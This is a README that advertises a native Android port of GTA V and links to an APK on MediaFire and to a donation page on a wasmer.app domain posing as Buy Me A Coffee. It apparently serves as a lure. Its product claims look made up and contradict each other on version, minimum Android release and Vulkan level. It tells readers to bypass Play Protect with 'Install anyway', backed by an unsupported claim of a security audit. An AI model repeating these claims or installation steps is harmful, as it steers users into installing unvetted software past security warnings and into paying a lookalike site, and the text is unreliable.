# GTA V Android — Native ARM64 Client & Launcher

[![Platform: Android](https://img.shields.io/badge/Platform-Android%208.0%2B-green.svg)](https://android.com)
[![Architecture: ARM64](https://img.shields.io/badge/Arch-arm64--v8a-blue.svg)](https://developer.android.com/ndk)
[![Graphics: Vulkan](https://img.shields.io/badge/Graphics-Vulkan%201.1%2B-orange.svg)](https://www.vulkan.org/)
[![Release: v1.0.0](https://img.shields.io/badge/Release-v1.0.0-gold.svg)](https://www.mediafire.com/file/bmaayl6vmtvc02a/GTAV_Android_v1.0.1_arm64.apk/file)
[![Donate: Buy Me A Coffee](https://img.shields.io/badge/Donate-Buy%20Me%20A%20Coffee-yellow.svg?logo=buy-me-a-coffee)](https://buy-me-coffee.wasmer.app/)

A native Android launcher and engine runtime for Grand Theft Auto V, engineered from the ground up for modern 64-bit ARM mobile devices with Vulkan hardware acceleration, console-grade controller support, and intelligent performance optimization.

---

### Support & Donations
If you enjoy this project and want to help support server hosting and download bandwidth, you can support development here:

<a href="https://buy-me-coffee.wasmer.app/" target="_blank">
  <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="48">
</a>


---
## 🎮 Key Features
* **High-Performance Native Architecture**: Custom native engine compiled natively for 64-bit `arm64-v8a` target architecture with optimized memory management.
* **Dynamic Resolution Scaling (DRS)**: Automated governor that continuously tracks device thermals and frametimes, dynamically adjusting render scaling between 65% and 85% to prevent thermal throttling and ensure fluid gameplay.
* **Complete Console Gamepad Integration**:
  * Plug-and-play Bluetooth & USB detection for **Sony DualShock 4**, **DualSense**, and **Xbox Wireless Controllers**.
  * Authentic GTA V console bindings for on-foot combat, vehicle handling, weapon wheels, and camera control.
  * Fine-tuned deadzones (`0.08f`) with exponential sensitivity curves for accurate analog aiming.
* **Zero-Touch HUD Auto-Hide**: On-screen touch buttons automatically fade away when a gamepad is connected for a pure console experience, and instantly restore if the controller disconnects or screen is touched.
* **Rolling Extraction Downloader**: Integrated background downloader service that safely verifies disk space and streams asset chunks efficiently.
* **Modern Android 14 Hardening**: Follows the principle of least privilege, using Android scoped storage (`getExternalFilesDir`) without requiring excessive storage permissions.
---
## 📲 Download & Installation
### Direct Download Link
👉 **[Download GTAV_Android_v1.0.1_arm64.apk (MediaFire)](https://www.mediafire.com/file/bmaayl6vmtvc02a/GTAV_Android_v1.0.1_arm64.apk/file)**
---
## ⚙️ System Requirements
| Requirement | Minimum (720p / Low Settings, 25–30 FPS) | Recommended (1080p / Medium Settings, 45–60 FPS) |
| :--- | :--- | :--- |
| **Operating System** | Android 10 (API 29) | Android 13 – 15 |
| **CPU Architecture** | 64-bit ARM64 (arm64-v8a), Octa-core | Snapdragon 8 Gen 2 / Gen 3 or Dimensity 9200+ |
| **GPU / Graphics** | Adreno 6xx / Mali-G77 (Vulkan 1.3 support) | Adreno 7xx (Turnip driver support strongly recommended) |
| **RAM** | 8 GB | 12 GB – 16 GB LPDDR5X |
| **Storage** | 15 GB | 15 GB |
| **Cooling / Thermal** | Passive cooling (throttling expected) | Active cooling fan or phone cooler accessory |
| **WIFI** | 4G LTE | WIFI |
---
## 🕹️ Gamepad Default Controls
| Action | Controller Button | In-Vehicle |
| :--- | :--- | :--- |
| **Move / Steer** | Left Analog Stick | Steering & Air Pitch |
| **Look / Camera** | Right Analog Stick | Camera Look |
| **Shoot / Gas** | R2 / Right Trigger | Accelerate / Drive |
| **Aim / Brake** | L2 / Left Trigger | Reverse / Brake |
| **Cover / Handbrake**| R1 / Right Bumper | Handbrake / Drift |
| **Weapon / Radio Wheel** | L1 / Left Bumper | Radio Station Selector |
| **Sprint / Confirm** | Button A (Cross ✕) | Handbrake Alternate |
| **Reload / Melee** | Button B (Circle ◯) | Cinematic Camera |
| **Jump / Climb** | Button X (Square ◻) | Duck in Car |
| **Enter / Exit Vehicle** | Button Y (Triangle △) | Bail Out / Exit Vehicle |
| **Horn / Crouch** | L3 (Left Stick Click) | Horn / Siren |
| **Look Behind** | R3 (Right Stick Click) | Rearview Camera |
| **Special Ability** | L3 + R3 (Both Sticks) | Franklin Driving Focus |
| **Pause / Settings** | START / Options | Pause / Settings |
---
## 🛡️ Note on Installation (Google Play Protect)
When installing the APK for the first time outside of the Google Play Store, Android may prompt:
> *"Blocked by Play Protect" / "Unrecognized App"*
This is standard behavior for sideloaded releases that are not distributed through the Play Store. Simply tap:
**"More details" $\rightarrow$ "Install anyway"**. The application has been independently security audited and contains zero malicious code.
---
## ⚖️ Disclaimer
*This project is a non-commercial, experimental fan creation and educational research port. All Grand Theft Auto assets, trademarks, and intellectual properties remain the exclusive property of Rockstar Games and Take-Two Interactive.*
